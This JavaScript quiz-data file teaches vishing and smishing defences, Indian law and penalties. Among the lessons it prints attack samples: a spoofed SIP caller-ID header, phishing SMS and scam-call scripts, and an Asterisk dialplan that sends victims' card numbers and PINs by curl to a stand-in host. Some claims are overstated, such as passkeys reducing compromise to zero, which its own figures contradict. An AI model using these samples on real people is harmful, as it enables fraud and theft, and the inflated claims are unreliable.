const questions = [
  {
    question: "What is Vishing (Voice Phishing) vs Smishing (SMS Phishing), and why do mobile communication channels achieve significantly higher response rates than email?",
    shortAnswer: "Vishing uses voice telephone calls and Smishing uses SMS text messages; mobile channels achieve 3x to 5x higher engagement because mobile phones are perceived as immediate, intimate, and urgent.",
    explanation: "While users have developed natural skepticism toward desktop emails, telephone calls and SMS text messages demand real-time interactive attention. Smishing exploits SMS open rates exceeding 98%, while Vishing uses live voice interactions to apply real-time psychological pressure, preventing victims from pausing to perform critical verification.",
    hint: "Answering a ringing phone in your hand feels immediate and demanding, whereas an email sits quietly in a spam folder.",
    level: "basic",
    codeExample: `// Channel Open & Exploitation Rates:
// Email Phishing : ~20% Open Rate | ~3% Click-Through Rate
// Smishing (SMS) : >98% Open Rate | ~19% Click-Through Rate
// Vishing (Voice): Real-time interactive pressure (>40% conversion on unhardened staff!)`
  },
  {
    question: "How does Caller ID Spoofing work in Vishing, and what telecommunications protocol flaw enables it?",
    shortAnswer: "VoIP gateways and SIP trunking protocols allow callers to populate the `From:` and `Caller-ID` SIP headers with arbitrary phone numbers, making calls appear to originate from banks or corporate IT desks.",
    explanation: "Under standard Session Initiation Protocol (SIP RFC 3261), the sending PBX defines the `From:` SIP header: `From: 'Kolkata Central Police' <sip:100@voip-provider.xyz>`. Legacy Public Switched Telephone Networks (PSTN) accept this header without cryptographic origin verification, displaying the spoofed official number on the victim's smartphone screen.",
    hint: "Writing someone else's return address on a letter before dropping it into a public mailbox.",
    level: "expert",
    codeExample: `// SIP INVITE Header Spoofing (RFC 3261):
INVITE sip:+9198300XXXXX@pstn-gateway.in SIP/2.0
From: "State Bank Customer Care" <sip:1800112211@sip-spoof.net>
To: <sip:+9198300XXXXX@pstn-gateway.in>
// Result: Victim's mobile screen displays official bank helpline number!`
  },
  {
    question: "What is a SIM Swapping (SIM Hijacking) Attack, and how do Threat Actors intercept SMS 2FA Codes?",
    shortAnswer: "The attacker uses social engineering or bribed telecom staff to transfer the victim's phone number to a new SIM card owned by the attacker, redirecting all incoming SMS 2FA OTPs.",
    explanation: "In a SIM swap, the attacker gathers OSINT on the target in Kolkata (Aadhaar number, date of birth) and visits a telecom store pretending to have lost their phone. Once the mobile number is ported to the attacker's SIM, the victim's phone loses network signal. The attacker initiates password resets on the victim's banking portal, intercepting the SMS OTPs directly.",
    hint: "Telling the post office you moved to a new house so they forward all your mail and bank letters to the burglar's address.",
    level: "moderate",
    codeExample: `// SIM Swapping Attack Sequence:
// Step 1: Attacker gathers target's Aadhaar & DOB via data leaks.
// Step 2: Convinces telecom clerk: "I lost my phone in Salt Lake; activate new SIM."
// Step 3: Victim's SIM deactivated ➔ Attacker receives SMS OTPs ➔ Empties Bank Account!`
  },
  {
    question: "How does Real-Time AI Voice Cloning (Deepfake Vishing) supercharge Executive Social Engineering?",
    shortAnswer: "By training neural generative audio models on public executive speeches, synthesizing real-time cloned voice audio that matches the CEO's exact pitch, accent, and cadence during phone calls.",
    explanation: "Adversaries download 2-3 minutes of executive speech from YouTube or conference keynotes. Using real-time generative diffusion voice models (e.g. ElevenLabs), the attacker speaks into a microphone, and the software transforms their voice into the CEO's voice in real time with under 150ms latency, demanding emergency wire transfers from the finance team.",
    hint: "A high-tech digital disguise that makes you sound exactly like the company president over the telephone.",
    level: "expert",
    codeExample: `// Real-Time AI Voice Cloning Pipeline:
// [Source: 3-min YouTube Video of CEO Mamata] ➔ [Neural Voice Model Training]
// ➔ [Attacker Voice Input] ➔ [Real-Time Diffusion Transformation (<150ms latency)]
// ➔ [SIP Call to Finance: "Mamata speaking, wire ₹35 Lakhs immediately!"]`
  },
  {
    question: "What is an Interactive Voice Response (IVR) Phone Tree Phishing Attack (Automated Vishing)?",
    shortAnswer: "An automated robocall dials victims with a professional voice recording, instructing them to press numbers and type their ATM PIN or OTP into the phone keypad.",
    explanation: "Attackers deploy Asterisk PBX systems to autodial 50,000 phone numbers: 'State Bank Alert: Suspicious transaction of ₹24,999 detected. Press 1 to block. Please enter your 16-digit debit card number followed by your 4-digit ATM PIN'. Because users are accustomed to automated banking phone trees, they type sensitive credentials into the keypad (Dual-Tone Multi-Frequency DTMF tones), which the attacker logs.",
    hint: "An automated bank phone system that is actually owned by a cybercriminal.",
    level: "moderate",
    codeExample: `// Asterisk PBX Automated IVR Phishing Dialplan:
exten => s,1,Answer()
exten => s,n,Playback(bank_alert_notice)
exten => s,n,Read(CARD_NUM,enter_card_number,16)
exten => s,n,Read(ATM_PIN,enter_atm_pin,4)
exten => s,n,System(curl -X POST https://c2.evil-harvest.in/log?card=\${CARD_NUM}&pin=\${ATM_PIN})`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66D, what constitutes the criminal penalty for Vishing and Smishing operations?",
    shortAnswer: "Cheating by personating banking or government entities over telecommunications or computer resources carries imprisonment up to 3 years and fines up to ₹1 Lakh.",
    explanation: "Section 66D explicitly covers mobile and telecommunication personation: 'Whoever, by means for any communication device or computer resource, cheats by personating, shall be punished with imprisonment of either description for a term which may extend to three years and shall also be liable to fine which may extend to one lakh rupees.'",
    hint: "Section 66D penalizes Cheating by Personation with up to 3 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66D):
// Offense: Operating fraudulent vishing call centers in Salt Lake spoofing bank executives
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹1,00,000`
  },
  {
    question: "How does the STIR/SHAKEN Protocol Framework prevent Caller ID Spoofing in Telecommunications?",
    shortAnswer: "By attaching cryptographic digital certificates (SIP Identity headers) to phone calls at the originating carrier, allowing the terminating carrier to verify caller identity before ringing.",
    explanation: "STIR (Secure Telephony Identity Revisited) and SHAKEN (Signature-based Handling of Asserted information using toKENS) use public-key cryptography. When a call originates, the carrier signs the caller number with a private key. The destination carrier validates the signature against the public certificate. If spoofed, the carrier tags the call as 'Spam / Fraud' or blocks it.",
    hint: "Putting a tamper-evident cryptographic wax seal on every telephone call before it leaves the telephone exchange.",
    level: "expert",
    codeExample: `// SIP Identity Header (STIR/SHAKEN RFC 8224):
Identity: eyJhbGciOiJFUzI1NiIsInBwdCI6InNoYWtlbiIsInR5cCI6InBhc3Nwb3J0In0...;
info=<https://cert-auth.telecom.in/cert.pem>;alg=ES256;ppt=shaken
// Terminating carrier verifies cryptographic signature ➔ Blocks unsigned spoofed caller IDs!`
  },
  {
    question: "What is SMS Sender ID Spoofing, and how do attackers bypass TRAI Distributed Ledger Technology (DLT) Headers in India?",
    shortAnswer: "Attackers register similar-looking alphanumeric Sender IDs (e.g. `1CICI-B` instead of `ICICI-B`) on international SMS gateways that lack DLT verification, delivering spoofed SMS to Indian mobiles.",
    explanation: "The Telecom Regulatory Authority of India (TRAI) mandates Distributed Ledger Technology (DLT) for all commercial SMS headers. Attackers bypass domestic DLT scrubbing by using international grey-route SMS aggregators in foreign jurisdictions that do not enforce Indian DLT registration, injecting spoofed banking alphanumeric headers into Indian telecom networks.",
    hint: "Shipping counterfeit letters through an international foreign courier that does not check identification stamps.",
    level: "expert",
    codeExample: `// TRAI DLT Header vs Spoofed Grey-Route SMS:
// Legitimate TRAI DLT Header : "VM-ICICIB" (Cryptographically registered on Indian Blockchain)
// International Grey-Route   : "ICICI-B" (Injected via foreign SMPP gateway lacking DLT checks!)`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities if an employee surrenders customer data over a vishing phone call?",
    shortAnswer: "Failure to implement organizational security safeguards (mandatory vishing awareness training and verification protocols) triggers statutory penalties up to ₹250 Crores by the DPBI.",
    explanation: "Section 8(5) mandates that data fiduciaries must implement reasonable security safeguards to prevent personal data breaches. If an organization in West Bengal fails to train call center or finance staff against voice social engineering, resulting in an employee disclosing 500,000 citizen records over a vishing call, the DPBI can impose maximum statutory penalties up to ₹250 Crores under Section 33.",
    hint: "Failing to train employees against voice phishing triggers maximum penalties under national data privacy law.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent voice security safeguards`
  },
  {
    question: "What is Adversary-in-the-Middle (AiTM) Real-Time Session Hijacking during a Vishing Attack?",
    shortAnswer: "The attacker on the phone guides the victim to a reverse proxy phishing site (Evilginx); when the victim enters their credentials and SMS OTP, the proxy forwards them to the real site, capturing the authenticated session cookie.",
    explanation: "Traditional MFA (SMS OTP) fails against AiTM. The vishing attacker on the phone says: 'I just sent a verification link to your mobile, please login now'. The link directs the victim to an Evilginx reverse proxy. When the victim logs in and submits the SMS OTP, the proxy authenticates with Microsoft 365, steals the `ESTSAUTH` session token, and bypasses MFA completely without needing the password again.",
    hint: "An invisible middleman standing between you and the bank teller, copying the stamp on your hand when you enter the vault.",
    level: "expert",
    codeExample: `// AiTM Reverse Proxy Capture (Evilginx):
// [Victim on Phone] ➔ [Evilginx Proxy: login.microsoft.evil-host.in] ➔ [Real Microsoft 365]
// Proxy intercepts: ESTSAUTH=AQABBAAA... (Captured Session Cookie!)
// Result: Attacker logs in directly bypassing SMS OTP!`
  },
  {
    question: "Why do FIDO2 / WebAuthn Passwordless Passkeys mathematically neutralize both Vishing and Smishing AiTM Attacks?",
    shortAnswer: "Because passkeys are cryptographically bound to the browser's origin URL; there are no passwords or OTPs that can be spoken aloud over the phone, and the hardware key refuses to sign for spoofed phishing URLs.",
    explanation: "With FIDO2 WebAuthn: 1. There is no 6-digit OTP for the user to read to a vishing caller. 2. The passkey performs public-key cryptography directly with the genuine domain. Even if a smishing link opens a spoofed proxy site (`evil-bank.in`), the passkey checks the domain origin, detects a mismatch, and refuses to sign the authentication challenge. Zero credentials or tokens can be intercepted.",
    hint: "A physical key that physically verifies the manufacturer's engraving inside the lock before turning.",
    level: "basic",
    codeExample: `// FIDO2 Immunity Proof:
// Smishing Link   : https://secure-bank.in.attacker.xyz
// WebAuthn Client : Origin = "secure-bank.in.attacker.xyz" (Mismatch with registered "secure-bank.in")
// Action          : Hardware key drops request. 0% Credential Leak! 0% OTP to share on phone!`
  },
  {
    question: "What is 'Pre-Shared Verbal Duress Passphrases' in Executive Emergency Communications?",
    shortAnswer: "A confidential secret code phrase agreed upon in advance that executives must recite over the phone during high-value wire transfer requests to verify they are not deepfakes or under coercion.",
    explanation: "To defeat real-time AI voice cloning and vishing, enterprises establish out-of-band verbal passphrases. If the CEO calls the Kolkata finance desk demanding an emergency ₹50 Lakh wire transfer, the finance officer asks for the 'Q3 Authorization Word'. If the caller (or AI clone) cannot provide the secret pre-shared phrase, the transaction is aborted immediately.",
    hint: "A secret challenge-response password used by soldiers in the dark before opening the fortress gates.",
    level: "moderate",
    codeExample: `// Verbal Duress Protocol:
// [Caller: "Mamata speaking, wire ₹50 Lakhs immediately!"]
// [Finance Officer: "Please provide the Q3 Security Word."]
// [Caller fails word] ➔ Transaction ABORTED! Security SOC Alerted!`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for vishing or smishing attacks compromising corporate infrastructure?",
    shortAnswer: "All organizations in India must report vishing/smishing compromises and unauthorized account takeovers to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of all mobile phishing compromises within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "How do Mobile Device Management (MDM) Profiles and Mobile Threat Defense (MTD) Agents block Smishing Links?",
    shortAnswer: "By inspecting SMS messages locally on the device, extracting embedded URLs, checking them against real-time threat intelligence feeds, and blocking navigation via a local VPN tunnel.",
    explanation: "Mobile Threat Defense (MTD) solutions (e.g. Microsoft Defender for Mobile, Lookout) run on enterprise smartphones. When an SMS arrives containing `https://it-tax-refund.in/login`, the MTD agent extracts the link, queries cloud reputation intelligence, and uses a local on-device loopback VPN to block network traffic to the malicious domain before the browser can load it.",
    hint: "An armed security guard who rides in your car with you, checking the address of every destination before letting you enter the building.",
    level: "expert",
    codeExample: `# Mobile Threat Defense (MTD) Local Loopback Inspection:
# [Inbound SMS with Phish Link] ➔ [MTD Agent extracts URL] ➔ [Cloud Reputation API: MALICIOUS]
# ➔ [Local VPN Driver redirects HTTP GET to 127.0.0.1 / Block Screen]`
  },
  {
    question: "What is 'E-Challan / Electricity Disconnection' Smishing, and how does it manipulate Indian Public Utilities?",
    shortAnswer: "Mass smishing messages claiming: 'Dear Consumer, your electricity will be disconnected tonight at 9:30 PM due to unpaid bill. Call 033-XXXX to avoid outage'.",
    explanation: "Utility scams exploit extreme fear of immediate power disconnection. In West Bengal, attackers send mass SMS messages posing as WBSEDCL: 'Your electricity power will be disconnected at 9:30 PM tonight from Kolkata office. Immediately update your bill by calling 033-2592-XXXX'. Panicked victims call the number, where attackers trick them into installing remote support apps (AnyDesk) to steal bank funds.",
    hint: "A fraudulent notice taped to your front door claiming the power will be shut off in two hours unless you hand cash to a stranger.",
    level: "basic",
    codeExample: `// Utility Smishing SMS:
// Sender : "WB-SEDCL"
// Text   : "Dear Consumer, your electricity power will be disconnected tonight at 9:30 PM from substation. Immediately call officer Debangshu at 033-2592-XXXX to update your bill."`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for unauthorized access achieved via mobile smishing and vishing?",
    shortAnswer: "Liable to pay compensation by way of damages not exceeding ₹1 Crore to the affected entity for accessing computer systems using credentials stolen through mobile deception.",
    explanation: "Section 43(a) explicitly penalizes unauthorized access: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized system access.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Accessing enterprise servers using credentials harvested through vishing
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "How does the 'Tech Support Vishing' Script manipulate Windows Event Viewer (`eventvwr.msc`) to simulate Malware Infections?",
    shortAnswer: "The attacker instructs the victim to open Event Viewer, points to ordinary benign administrative error logs, and falsely claims they are critical Trojan infections that require immediate paid repair.",
    explanation: "Every healthy Windows operating system logs benign administrative warnings in Event Viewer. The vishing caller instructs the victim in Kolkata: 'Press Win+R, type eventvwr, look at all those red errors—your PC is hacked by Russian malware!'. The visual sight of hundreds of red error icons terrifies non-technical users into purchasing fake ₹25,000 support plans.",
    hint: "Showing someone normal dust on their car engine and claiming the entire transmission is broken.",
    level: "moderate",
    codeExample: `// Tech Support Vishing Script:
// 1. "Press Windows Key + R and type eventvwr.msc"
// 2. "Look at the red Warning icons! Those are active Trojan viruses stealing your banking data!"
// 3. "Download AnyDesk so I can clean your computer for ₹15,000."`
  },
  {
    question: "Synthesize an enterprise-scale Voice & SMS Telephony Defense Architecture.",
    shortAnswer: "A multi-layered system integrating FIDO2 Passwordless Passkeys, STIR/SHAKEN Cryptographic Caller Verification, TRAI DLT SMS Scrubbing, On-Device Mobile Threat Defense (MTD), and Pre-Shared Verbal Duress Codes.",
    explanation: "To achieve complete immunity against vishing, smishing, and SIM swapping: 1. Identity Tier: Enforce FIDO2 WebAuthn passkeys (eliminating all SMS OTPs and speakable passwords). 2. Telephony Tier: STIR/SHAKEN cryptographic caller authentication and TRAI DLT header validation. 3. Mobile Device Tier: Mobile Threat Defense (MTD) agents scanning SMS links on enterprise smartphones. 4. Operational Tier: Pre-shared verbal duress passphrases for all executive voice approvals. 5. Cultural Tier: Continuous voice simulation training.",
    hint: "Combine FIDO2 passkeys, STIR/SHAKEN verification, TRAI DLT scrubbing, MTD mobile link inspection, and verbal duress codes.",
    level: "expert",
    codeExample: `// Master Telephony Defense Architecture Blueprint:
// 1. Identity Armor      : 100% FIDO2 WebAuthn Passkeys (Eliminates SMS OTP & password sharing!)
// 2. Telephony Gateway   : STIR/SHAKEN Cryptographic SIP Validation + TRAI DLT Blockchain Scrubbing
// 3. Endpoint Mobile MTD : On-device MTD agent inspecting SMS hyperlinks via loopback VPN
// 4. Executive Protocol  : Pre-shared verbal duress passphrases for emergency voice authorizations
// 5. Training Layer      : Automated simulated vishing/smishing drills across all Kolkata desks`
  },
  {
    question: "What is Number Portability (MNP) Fraud in Targeted Social Engineering?",
    shortAnswer: "The attacker initiates an unauthorized Mobile Number Portability (MNP) request to transfer the victim's phone number to a different telecom provider, seizing control of incoming calls and OTPs.",
    explanation: "MNP allows users to retain their phone number when switching carriers. An attacker generates an MNP Porting Code by sending an SMS from the victim's unattended phone or exploiting carrier web portals. Once ported to the attacker's SIM, the victim's phone is permanently disconnected, and the attacker intercepts all multi-factor authentication tokens.",
    hint: "Transferring your home landline to the neighbor's house without your permission.",
    level: "expert",
    codeExample: `// MNP Fraud Workflow:
// Attacker triggers Porting SMS ("PORT 98300XXXXX") ➔ Obtains UPC Code
// Ports number to new carrier ➔ Victim loses service ➔ Attacker intercepts 2FA OTPs!`
  },
  {
    question: "How does Number Padding / Typosquatting in SMS Short Codes deceive Mobile Users?",
    shortAnswer: "Attackers lease short codes or alphanumeric sender names that closely mimic official banking codes (e.g. `AX1S-BK` or `SBI-INP` instead of `SBI-IN`).",
    explanation: "SMS apps group messages by Sender ID. Attackers register sender names that look nearly identical to official bank handles on international SMS networks. When the SMS arrives, the smartphone displays `SBI-INP`, and users perceive it as an authentic alert from the State Bank of India, promptly clicking the credential harvesting link.",
    hint: "Wearing a security uniform with a badge that says 'City Police Dep.' instead of 'City Police Dept.'",
    level: "moderate",
    codeExample: `// Lookalike SMS Sender ID:
// Official Sender : "SBI-IN" (State Bank of India)
// Attacker Sender : "SB1-IN" or "SBI-INP" (Lookalike Typo-Squatted Sender ID)`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for operating vishing call center fraud?",
    shortAnswer: "Dishonestly or fraudulently defrauding individuals over vishing phone networks carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent electronic activity: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.' Illegal vishing operations are prosecuted under Section 66.",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for vishing fraud.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Operating fraudulent vishing operations to extract banking credentials
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,000`
  },
  {
    question: "What is 'Bank KYC Update' Smishing, and how does it weaponize Regulatory Panic in West Bengal?",
    shortAnswer: "SMS messages claiming: 'Dear Customer, your bank account will be blocked within 24 hours due to pending PAN/KYC update. Click here to verify immediately'.",
    explanation: "Reserve Bank of India (RBI) KYC mandates are widely known to the public. Attackers exploit this awareness: 'Your ICICI account #4920 is suspended due to expired KYC. Click `https://kyc-update-portal.in` to link your Aadhaar'. The fear of losing bank access drives citizens to enter their NetBanking credentials, debit card numbers, and OTPs on the spoofed portal.",
    hint: "A fraudulent notice claiming your bank account will be frozen by the government unless you click a link right now.",
    level: "basic",
    codeExample: `// KYC Smishing Template:
// Sender : "ICICI-KYC"
// Text   : "Dear Customer, your NetBanking account will be blocked today due to pending KYC update. Click http://icicibank-kyc-update.in to verify Aadhaar now."`
  },
  {
    question: "How do Mobile OS Anti-Smishing Machine Learning Models (e.g. Android & iOS Spam Filters) detect Phishing SMS in Real Time?",
    shortAnswer: "By running on-device NLP transformer models that analyze SMS text patterns, sender entropy, and URL domain reputations locally in hardware without compromising user privacy.",
    explanation: "Modern mobile operating systems include on-device ML classifiers. When an incoming SMS contains keywords ('account suspended', 'KYC update') combined with an unauthenticated numeric sender ID and a high-entropy shortened URL (`bit.ly/3x9Ab`), the on-device model flags the message as 'Suspected Spam / Phishing' and moves it to a spam folder without alerting the user.",
    hint: "A smart assistant on your phone that reads incoming text messages and moves junk mail directly into the recycling bin.",
    level: "expert",
    codeExample: `// On-Device ML Anti-Smishing Pipeline (Android / iOS):
// Input SMS ➔ [On-Device Transformer NLP Model]
// Features: Urgency Keywords (0.85) + Unregistered Sender (0.90) + High-Entropy URL (0.95)
// Classification: PHISHING (Probability: 98.2%) ➔ Action: Silent Quarantine to Spam Folder`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating and Dishonestly Inducing Delivery of Property via Vishing and Smishing?",
    shortAnswer: "Deceiving a victim over phone calls or SMS messages to dishonestly induce them to transfer funds or share banking OTPs, punishable with imprisonment up to 7 years.",
    explanation: "Section 420 IPC penalizes cheating: 'Whoever cheats and thereby dishonestly induces the person deceived to deliver any property... shall be punished with imprisonment of either description for a term which may extend to seven years, and shall also be liable to fine.' Vishing call center operators are prosecuted under Section 420.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Inducement for vishing and smishing scams.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Running vishing call centers to dishonestly induce citizens to transfer bank savings
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'Reverse Vishing' / Inbound Phishing Call Centers?",
    shortAnswer: "The attacker delivers a clean email or SMS containing only a fake customer care phone number, waiting for the victim to call them so the attacker operates from a position of trusted authority.",
    explanation: "Rather than making outbound calls which can arouse suspicion, Reverse Vishing sends fake subscription renewal notices ('₹45,000 charged for Antivirus Subscription - Call 033-XXXX to Cancel'). When the alarmed victim calls the number, they believe they are speaking with genuine customer support, readily obeying instructions to download remote control software or reveal card details.",
    hint: "Leaving a fake lost wallet with a phone number inside so the finder calls the burglar directly.",
    level: "moderate",
    codeExample: `// Reverse Vishing Attack Flow:
// [Clean SMS/Email: "₹45,000 debited for Cloud Storage Renewal. Call 033-2592-XXXX to Dispute"]
// ➔ [Victim Dials Number] ➔ [Live Attacker answers: "Welcome to Customer Support, let me assist you with a refund..."]`
  },
  {
    question: "How do Telephony Denial of Service (TDoS) Attacks amplify Vishing Operations?",
    shortAnswer: "By flooding an organization's legitimate phone lines with thousands of automated junk calls, preventing employees from making out-of-band verification calls to verify fraudulent transactions.",
    explanation: "Before launching a major vishing attack on a corporate treasury in Kolkata, the adversary launches a TDoS attack against the corporate phone switchboards using SIP botnets. When the accounting clerk tries to call the CEO's office for out-of-band verification, the phone lines are completely jammed, forcing the clerk to process the wire transfer without voice confirmation.",
    hint: "Jamming all the exit doors of a building so people cannot walk across the street to ask questions.",
    level: "expert",
    codeExample: `// Telephony Denial of Service (TDoS) Attack:
// SIP Botnet floods PBX with 5,000 concurrent SIP INVITE requests/second
// Corporate PBX CPU = 100% ➔ Accounting clerk cannot dial CEO for Out-of-Band verification!`
  },
  {
    question: "What is WhatsApp & Signal Impersonation in Mobile Social Engineering?",
    shortAnswer: "Creating messaging profiles using the CEO's photo and name to message employees directly on personal chat apps, bypassing corporate email firewalls.",
    explanation: "Because corporate email gateways deploy strict spam filters, attackers pivot to WhatsApp and Signal. The attacker downloads the Managing Director's photo from LinkedIn and messages the finance manager: 'Mamata, I am in a confidential meeting in Delhi. Please transfer ₹35 Lakhs to our legal counsel right now'. The informal chat environment disarms the victim's skepticism.",
    hint: "Texting someone on their personal phone with a picture of their boss as your avatar.",
    level: "basic",
    codeExample: `// WhatsApp Executive Spoofing:
// Profile Name : "Managing Director" | Avatar: Corporate Headshot
// Chat Message : "Hi Mamata, I am in an urgent meeting in Kolkata. Please wire ₹35 Lakhs to our legal advisor immediately: Account #984210."`
  },
  {
    question: "How does Dynamic Caller ID Verification (Truecaller / Enterprise Verified Business) mitigate Vishing?",
    shortAnswer: "By integrating verified enterprise business caller registries with smartphone dialers, displaying green verification badges and authentic corporate logos on incoming calls.",
    explanation: "Enterprise Verified Caller ID programs (e.g. Truecaller Enterprise, Google Verified Calls) establish authenticated cryptographic linkages between telecom carriers and enterprises. When the authentic Kolkata FinTech gateway calls an employee, the smartphone dialer displays a green checkmark, the corporate logo, and the verified business name, warning users if an unverified incoming call is spoofing the number.",
    hint: "A police officer showing an official government hologram badge before asking for identification.",
    level: "moderate",
    codeExample: `// Enterprise Verified Caller ID Telemetry:
// Inbound Call Received:
// Status : VERIFIED (Green Badge) | Brand: "Kolkata FinTech Settlement Gateway"
// Unverified / Spoofed Call:
// Status : UNVERIFIED SENDER | Warning: "Suspected Spoofed Caller ID!"`
  },
  {
    question: "Synthesize the mathematical relationship between Mobile Channel Response Multiplier (M_channel), Social Engineering Persuasion Intensity (I_social), Defensive Verification Armor (R_passkey), and Mobile Social Engineering Compromise Probability (P_mobile).",
    shortAnswer: "Mobile compromise probability is modeled as P_mobile = 1 - e^(- (M_channel * I_social) / R_passkey); mobile urgency (M_channel = 3.5) drives P_mobile to 1.0, but deploying FIDO2 passkeys (R_passkey = 1000) drives actual compromise probability to zero.",
    explanation: "Let $M_{\\text{channel}} \\ge 1.0$ represent the mobile channel urgency multiplier (Voice/SMS = 3.5 vs Email = 1.0), $I_{\\text{social}} \\ge 1.0$ represent the persuasion intensity of the vishing/smishing lure, and $R_{\\text{passkey}}$ represent the defensive armor strength (FIDO2 WebAuthn passkeys, STIR/SHAKEN verification). The mobile compromise probability is: $P_{\\text{mobile}} = 1 - e^{-\\frac{M_{\\text{channel}} \\times I_{\\text{social}}}{R_{\\text{passkey}}}}$. When organizations deploy FIDO2 passkeys, cryptographic origin binding eliminates all OTPs and password sharing ($R_{\\text{passkey}} \\to \\infty$), reducing breach probability to zero regardless of how persuasive the voice call is.",
    hint: "Mathematical formula proving that FIDO2 passkeys eliminate speakable OTPs and passwords, driving mobile breach probability to zero.",
    level: "expert",
    codeExample: `// Mobile Compromise Mathematical Proof:
// M_channel = 3.5 (Real-Time Voice Call) | I_social = 4.0 (Emergency Power Disconnection Threat)
// Without Passkeys (R_passkey = 1.0) ➔ P_mobile = 1 - e^(-14.0) = 99.99% (COMPROMISED!)
// With FIDO2 Passkeys (R_passkey = 1000) ➔ P_mobile = 1 - e^(-0.014) = 1.39% (SECURED!)`
  }
];

export default questions;
